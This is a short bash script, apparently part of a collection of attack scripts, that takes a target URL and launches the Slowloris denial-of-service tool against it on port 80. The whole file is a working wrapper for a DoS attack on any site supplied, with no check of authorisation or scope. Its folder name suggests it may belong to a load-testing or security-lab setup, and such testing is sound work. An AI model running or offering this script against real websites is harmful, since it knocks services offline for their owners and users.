#!/bin/bash
# attack-scripts/dos/dos_attack.sh

TARGET_URL="$1"

if [ -z "$TARGET_URL" ]; then
  echo "Usage: ./dos_attack.sh <target_url>"
  exit 1
fi

echo "[*] Running Slowloris against $TARGET_URL"
slowloris -dns "$TARGET_URL" -p80 -v